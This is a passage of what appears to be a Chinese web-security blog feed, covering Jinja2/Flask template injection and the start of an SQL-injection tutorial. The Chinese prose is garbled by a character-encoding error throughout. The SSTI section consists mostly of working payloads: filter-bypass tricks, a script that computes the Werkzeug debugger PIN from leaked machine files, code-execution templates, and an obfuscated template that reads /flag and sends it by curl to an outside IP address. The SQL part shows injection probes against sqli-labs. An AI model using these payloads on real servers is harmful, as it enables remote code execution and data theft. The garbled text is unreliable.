class="code"><pre><span class="line">&#123;% set a=dict(Spongebob)%&#125;&#123;&#123;a&#125;&#125;# åˆ›å»ºå­—å…¸aï¼Œé”®åSpongebobï¼Œé”®å€¼1</span><br><span class="line"></span><br><span class="line">&#123;% set a=dict(__cla=1,ss__=2)join%&#125;&#123;&#123;a&#125;&#125;# åˆ›å»ºå­—å…¸aï¼ŒjoinæŠŠå‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><p><strong>è·å–ç¬¦å·</strong></p><p>åˆ©ç”¨flaskå†…ç½®å‡½æ•°å’Œå¯¹è±¡è·å–ç¬¦å·ï¼Œ<code>&#123;&#123;a[n]&#125;&#125;</code>å¯ä»¥è·å–æŒ‡å®šå­—ç¬¦ï¼ˆnä¸ºæŒ‡å®šå­—ç¬¦ä¸‹æ ‡ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=(&#123;&#125;|select()|string())%&#125;&#123;&#123;a&#125;&#125;# è·å–ä¸‹åˆ’çº¿</span><br><span class="line">&#123;% set a=(self|string())%&#125;&#123;&#123;a&#125;&#125;# è·å–ç©ºæ ¼</span><br><span class="line">&#123;% set a=(self|string|urlencode%&#125;&#123;&#123;a&#125;&#125;# è·å–ç™¾åˆ†å·</span><br><span class="line">&#123;% set a=(app.__doc__|string)%&#125;&#123;&#123;a&#125;&#125;# </span><br></pre></td></tr></table></figure><h1 id="debug-pinç è®¡ç®—"><a href="#debug-pinç è®¡ç®—" class="headerlink" title="debug pinç è®¡ç®—"></a>debug pinç è®¡ç®—</h1><h2 id="pinç ç”ŸæˆåŸç†"><a href="#pinç ç”ŸæˆåŸç†" class="headerlink" title="pinç ç”ŸæˆåŸç†"></a>pinç ç”ŸæˆåŸç†</h2><p><strong>pinç ä¸»è¦ç”±å…­ä¸ªå‚æ•°æ„æˆ</strong></p><ol><li><code>username</code> æ‰§è¡Œä»£ç æ—¶å€™çš„ç”¨æˆ·å</li><li><code>getattr(app,&quot;__name__&quot;,app.__class__.__name__)</code> å›ºå®šFlask</li><li><code>modname</code> å›ºå®šå€¼é»˜è®¤flask.app</li><li><code>getattr(mod,&quot;__file__,None)</code> app.pyæ–‡ä»¶æ‰€åœ¨è·¯å¾„</li><li><code>str(uuid,getnode())</code> ç”µè„‘ä¸Šmacåœ°å€ï¼ˆåè¿›åˆ¶ï¼‰</li><li><code>get_machine_id()</code> æ ¹æ®æ“ä½œç³»ç»Ÿä¸åŒï¼Œæœ‰å››ç§è·å–æ–¹å¼</li></ol><blockquote><p>ç”Ÿæˆpinç Debugger PINçš„ä»£ç åœ¨<code>get_pin_and_cookie_name</code></p></blockquote><h2 id="pinç è®¡ç®—"><a href="#pinç è®¡ç®—" class="headerlink" title="pinç è®¡ç®—"></a>pinç è®¡ç®—</h2><p><strong>æ¡ä»¶ï¼š</strong>æœ‰æ–‡ä»¶åŒ…å«æˆ–æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä¸”å¼€å¯debugåŠŸèƒ½</p><p>ä¾‹é¢˜ï¼š</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/debug_01.png" alt=""></p><p>ç‚¹å‡»Read somethingsä¼šè·³è½¬é¡µé¢ï¼Œurlå¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œä»è€Œè¯»å–æœåŠ¡å™¨éƒ¨åˆ†æ–‡ä»¶</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/debug_02.png" alt=""></p><p><code>/etc/passwd</code>å¯ä»¥çœ‹åˆ°ç”¨æˆ·åï¼Œ1000ä»¥ä¸Šä¸€èˆ¬ä¸ºäººä¸ºåˆ›å»ºï¼Œé»˜è®¤ä¸ºroot</p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/debug_03.png" alt=""></p><p><strong>å…³äºuuidçš„è¯»å–</strong></p><blockquote><p><code>/sys/classs/net/ens33/address</code> CentOS</p><p><code>/sys/classs/net/eth0/address</code>  ubuntu</p></blockquote><p><strong>å…³äºmachine_idçš„è¯»å–</strong></p><blockquote><p><code>/etc/machine-id</code> åœ¨å‰</p><p><code>/proc/self/cgroup</code> docker    ç¬¬ä¸€è¡Œæœ€åä¸€éƒ¨åˆ†</p></blockquote><h2 id="è®¡ç®—pinç çš„è„šæœ¬"><a href="#è®¡ç®—pinç çš„è„šæœ¬" class="headerlink" title="è®¡ç®—pinç çš„è„šæœ¬"></a>è®¡ç®—pinç çš„è„šæœ¬</h2><p><strong>python2.7</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">                                                                    <span class="string">&#x27;root&#x27;</span>,<span class="comment">#username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app,&#x27;__name__&#x27;,getattr(app.__class__,&#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&#x27;</span><span class="comment"># getattr(mod,&#x27;__file__&#x27;,None)</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># str(uuid.getnode()),/sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;b7471d41202f4da392a4743b37ea3b69&#x27;</span><span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits,private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit,<span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(),<span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size,<span class="string">&#x27;0&#x27;</span>)<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(num),group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p><strong>python3.10</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">                                                                    <span class="string">&#x27;root&#x27;</span>,<span class="comment">#username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app,&#x27;__name__&#x27;,getattr(app.__class__,&#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages/flask/app.pyc&#x27;</span><span class="comment"># getattr(mod,&#x27;__file__&#x27;,None)</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892354&#x27;</span>,<span class="comment"># str(uuid.getnode()),/sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;b7471d41202f4da392a4743b37ea3b69&#x27;</span><span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits,private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit,<span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(),<span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size,<span class="string">&#x27;0&#x27;</span>)<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(num),group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><h1 id="å¸¸ç”¨Payload"><a href="#å¸¸ç”¨Payload" class="headerlink" title="å¸¸ç”¨Payload"></a>å¸¸ç”¨Payload</h1><h2 id="æ™®é€šè¿‡æ»¤payload"><a href="#æ™®é€šè¿‡æ»¤payload" class="headerlink" title="æ™®é€šè¿‡æ»¤payload"></a>æ™®é€šè¿‡æ»¤payload</h2><ul><li>è·å–evalå‡½æ•°æ‰§è¡Œä»»æ„ä»£ç æµ‹è¯•ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="ç©¶æè¿‡æ»¤payload"><a href="#ç©¶æè¿‡æ»¤payload" class="headerlink" title="ç©¶æè¿‡æ»¤payload"></a>ç©¶æè¿‡æ»¤payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18) %&#125;&#123;% set gb=(xiahuaxian,xiahuaxian,dict(glo=a,bals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;&#123;% set get=dict(get=a)|join%&#125;&#123;% set os=dict(os=a)|join %&#125;&#123;% set popen=dict(popen=a)|join%&#125;&#123;% set ca=dict(ca=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set nn=dict(n=a)|join%&#125;</span><br><span class="line">&#123;% set tt=dict(t=a)|join%&#125;</span><br><span class="line">&#123;% set ff=dict(f=a)|join%&#125;</span><br><span class="line">&#123;% set dd=dict(index=a)|join%&#125;</span><br><span class="line">&#123;% set id=dict(ind=a,ex=a)|join%&#125;</span><br><span class="line">&#123;% set five=(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three=(lipsum|string|list)|attr(id)(nn) %&#125;</span><br><span class="line">&#123;% set one=(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set bin=(xiahuaxian,xiahuaxian,dict(built=a,ins=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set chcr=(lipsum|attr(gb))|attr(get)(bin)|attr(get)(cr) %&#125;</span><br><span class="line">&#123;% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span><br><span class="line">&#123;% set dh=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set ls=dict(ls=a)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set space=chcr(three*three*five-five-five-three) %&#125;</span><br><span class="line">&#123;% set shell=(ca,space,dict(f1ag=a)|join,dh,dict(txt=a)|join)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print(shell)%&#125;</span><br><span class="line">&#123;%print(lipsum|attr(gb)|attr(get)(os)|attr(popen)(shell)|attr(rd)())%&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤–å¸¦payload"><a href="#å¤–å¸¦payload" class="headerlink" title="å¤–å¸¦payload"></a>å¤–å¸¦payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set c=dict(c=z)|join|length %&#125;</span><br><span class="line">&#123;% set cc=dict(cc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccc=dict(ccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccc=dict(cccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccc=dict(ccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccc=dict(cccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccccc=dict(ccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccccc=dict(cccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set ccccccccc=dict(ccccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set cccccccccc=dict(cccccccccc=z)|join|length %&#125;</span><br><span class="line">&#123;% set space=(()|select|string|list).pop(ccccc*cc) %&#125;</span><br><span class="line">&#123;% set xhx=(()|select|string|list).pop(ccc*cccccccc) %&#125;</span><br><span class="line">&#123;% set point=(config|string|list).pop(cccccccccc*cc*cccccccccc-ccccccccc) %&#125;</span><br><span class="line">&#123;% set maohao=(config|string|list).pop(cc*ccccccc) %&#125;</span><br><span class="line">&#123;% set xiegang=(config|string|list).pop(-cccccccc*cccccccc) %&#125;</span><br><span class="line">&#123;% set globals=(xhx,xhx,dict(globals=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set builtins=(xhx,xhx,dict(builtins=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set open=(lipsum|attr(globals)).get(builtins).open %&#125;</span><br><span class="line">&#123;% set result=open((xiegang,dict(flag=z)|join)|join).read() %&#125;</span><br><span class="line">&#123;% set curlcmd=(dict(curl=z)|join,space,dict(http=z)|join,maohao,xiegang,xiegang,cccc,ccccccccc,point,cc,ccc,cc,point,ccccccc,cccccc,point,c,cccc,maohao,cccc,c-c,c-c,c-c,xiegang,result)|join %&#125; </span><br><span class="line">&#123;% set ohs=dict(o=z,s=z)|join %&#125;</span><br><span class="line">&#123;% set shell=(lipsum|attr(globals)).get(ohs).popen(curlcmd) %&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://xz.aliyun.com/t/3679">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨ </a></p><p><a href="https://www.cnblogs.com/chalan630/p/12578418.html#ä¸€-ä»€ä¹ˆæ˜¯ssti">SSTI(æ¨¡æ¿æ³¨å…¥)</a></p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTIå®Œå…¨å­¦ä¹ </a></p><p><a href="https://www.jianshu.com/p/a1d6ae580add">flask sstiæ¼æ´å¤ç° </a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">SSTI(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥)å­¦ä¹ </a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥)</a></p><p><a href="https://xz.aliyun.com/t/2308#toc-9">ç”¨pythonç»§æ‰¿é“¾æäº‹æƒ…</a></p><p><a href="https://cloud.tencent.com/developer/article/1637529">Pythonå®‰å…¨ä¹‹SSTIâ€”â€”Flask/Jinja2</a></p><p><a href="https://xz.aliyun.com/t/7746#toc-10">SSTIæ¨¡æ¿æ³¨å…¥(Python+Jinja2)</a></p><p><a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTIæ¨¡æ¿æ³¨å…¥/">SSTIæ¨¡æ¿æ³¨å…¥</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹SSTIæ¼æ´/">ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹ SSTI æ¼æ´</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥</title>
      <link href="/2023/07/26/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/26/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p><strong>SQLæ³¨å…¥</strong>ï¼ˆSQL Injectionï¼‰æ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œå½¢æˆçš„ä¸»è¦åŸå› æ˜¯webåº”ç”¨ç¨‹åºåœ¨æ¥æ”¶ç›¸å…³æ•°æ®å‚æ•°æ—¶æœªåšå¥½è¿‡æ»¤ï¼Œå°†å…¶ç›´æ¥å¸¦å…¥åˆ°æ•°æ®åº“ä¸­æŸ¥è¯¢ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ‹¼æ¥æ‰§è¡Œæ„é€ çš„SQLè¯­å¥ã€‚</p></blockquote><h1 id="å¸¸è§çš„æ³¨å…¥æ‰‹æ³•"><a href="#å¸¸è§çš„æ³¨å…¥æ‰‹æ³•" class="headerlink" title="å¸¸è§çš„æ³¨å…¥æ‰‹æ³•"></a>å¸¸è§çš„æ³¨å…¥æ‰‹æ³•</h1><p>SQL æ³¨å…¥æ¼æ´æ ¹æ®ä¸åŒçš„æ ‡å‡†ï¼Œæœ‰ä¸åŒçš„åˆ†ç±»ã€‚å¦‚æŒ‰ç…§å‚æ•°ç±»å‹å¯åˆ†ä¸ºä¸¤ç§ï¼šæ•°å­—å‹å’Œå­—ç¬¦å‹</p><p><strong>å‚æ•°ç±»å‹åˆ†ç±»</strong></p><ul><li>æ•°å­—å‹ï¼šå½“è¾“å…¥çš„å‚æ•°ä¸ºæ•´å½¢æ—¶ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥æ¼æ´ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯æ•°å­—å‹æ³¨å…¥ã€‚</li></ul><p>å¦‚ <code>www.text.com/text.php?id=3</code> å¯¹åº”çš„sqlè¯­å¥ä¸º <code>select * from table where id=3</code></p><ul><li>å­—ç¬¦å‹ï¼šå­—ç¬¦å‹æ³¨å…¥æ­£å¥½ç›¸å</li></ul><p>å½“è¾“å…¥çš„å‚æ•°è¢«å½“åšå­—ç¬¦ä¸²æ—¶ï¼Œç§°ä¸ºå­—ç¬¦å‹ã€‚å­—ç¬¦å‹å’Œæ•°å­—å‹æœ€å¤§çš„ä¸€ä¸ªåŒºåˆ«åœ¨äºï¼Œæ•°å­—å‹ä¸éœ€è¦å•å¼•å·æ¥é—­åˆï¼Œè€Œå­—ç¬¦ä¸²ä¸€èˆ¬éœ€è¦é€šè¿‡å¼•å·æ¥é—­åˆçš„ã€‚å³çœ‹å‚æ•°æ˜¯å¦è¢«å¼•å·åŒ…è£¹</p><p>ä¾‹å¦‚æ•°å­—å‹è¯­å¥ï¼š<code>select * from table where id =3</code></p><p>åˆ™å­—ç¬¦å‹å¦‚ä¸‹ï¼š<code>select * from table where name=&#39;admin&#39;</code></p><p><strong>æ³¨å…¥æ‰‹æ³•åˆ†ç±»</strong></p><ul><li>UNION query SQL injectionï¼ˆè”åˆæŸ¥è¯¢æ³¨å…¥ï¼‰</li><li>Error-based SQL injectionï¼ˆé”™å‹æ³¨å…¥ï¼‰</li><li>Boolean-based blind SQL injectionï¼ˆåŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼‰</li><li>Time-based blind SQL injectionï¼ˆåŸºäºæ—¶é—´çš„ç›²æ³¨ï¼‰</li><li>Stacked queries SQL injectionï¼ˆå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰</li></ul><h2 id="è”åˆæŸ¥è¯¢-unionæ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢-unionæ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢(unionæ³¨å…¥)"></a>è”åˆæŸ¥è¯¢(unionæ³¨å…¥)</h2><blockquote><p>è”åˆæŸ¥è¯¢é€‚åˆäºæœ‰æ˜¾ç¤ºä½çš„æ³¨å…¥ï¼Œå³é¡µé¢æŸä¸ªä½ç½®ä¼šæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„æ•°æ®çš„å˜åŒ–è€Œå˜åŒ– </p></blockquote><p>æˆ‘ä»¬ä»¥sqli-labsç¬¬ä¸€å…³ä¸ºä¾‹æ¥å­¦ä¹ è”åˆæŸ¥è¯¢ã€‚å¦‚ä¸‹ï¼Œè¦æ±‚æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªidå€¼è¿‡å»ã€‚ä¼ å‚?id=1ï¼Œå½“æˆ‘ä»¬è¾“å…¥id=1å’Œid=2æ—¶ï¼Œé¡µé¢ä¸­nameå€¼å’Œpasswordçš„å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¯´æ˜æ­¤æ—¶æˆ‘ä»¬è¾“å…¥çš„æ•°æ®å’Œæ•°æ®åº“æœ‰äº¤äº’å¹¶ä¸”å°†æ•°æ®æ˜¾ç¤ºåœ¨å±å¹•ä¸Šäº†</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql.png" alt=""></p><ul><li>æ³¨å…¥ç‚¹åˆ¤æ–­</li></ul><p>å¼€å§‹åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œè¾“å…¥<code>?id=1&#39;</code>ï¼Œé¡µé¢å‘ç”ŸæŠ¥é”™ï¼Œè¯´æ˜åç«¯å¯¹æˆ‘å‰ç«¯çš„æ•°æ®è¾“å…¥æ²¡æœ‰å¾ˆå¥½çš„è¿‡æ»¤ï¼Œäº§ç”Ÿäº†sqlæ³¨å…¥æ¼æ´</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_01.png" alt=""></p><p>ç»§ç»­åˆ¤æ–­ï¼Œè¾“å…¥<code>?id=1&#39; and 1=1 --+</code> é¡µé¢æ­£å¸¸æ˜¾ç¤º</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_02.png" alt=""></p><p><code>?id=1&#39; and 1=2 --+</code> é¡µé¢ä¸æ­£å¸¸æ˜¾ç¤ºï¼Œè¯´æ˜ç¨‹åºå¯¹æˆ‘ä»¬çš„è¾“å…¥åšå‡ºäº†æ­£ç¡®çš„åˆ¤æ–­ï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹å°±æ˜¯å•å¼•å·</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_03.png" alt=""></p><ul><li>åˆ¤æ–­å½“å‰è¡¨çš„å­—æ®µä¸ªæ•°</li></ul><p>è¾“å…¥order by 3ï¼Œé¡µé¢æ— å¼‚å¸¸ååº”</p><p><code>?id=1&#39; order by 3 --+</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_04.png" alt=""></p><p>å°†3ä¿®æ”¹ä¸º4ï¼Œæ­¤æ—¶æ˜¾ç¤ºæœªçŸ¥çš„åˆ—ï¼Œè¯´æ˜æ­¤æ—¶å½“å‰è¡¨ä¸­åªæœ‰3åˆ—</p><p><code>?id=1&#39; order by 4 --+</code></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_05.png" 